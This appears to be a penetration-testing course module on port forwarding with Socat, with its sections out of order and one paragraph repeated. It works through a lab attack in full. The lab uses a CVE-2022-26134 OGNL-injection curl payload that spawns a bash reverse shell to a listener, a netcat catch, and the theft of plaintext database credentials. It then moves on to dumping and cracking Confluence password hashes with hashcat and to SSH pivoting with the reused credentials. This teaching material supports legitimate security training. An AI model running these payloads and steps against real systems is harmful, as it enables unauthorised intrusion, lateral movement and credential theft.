This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

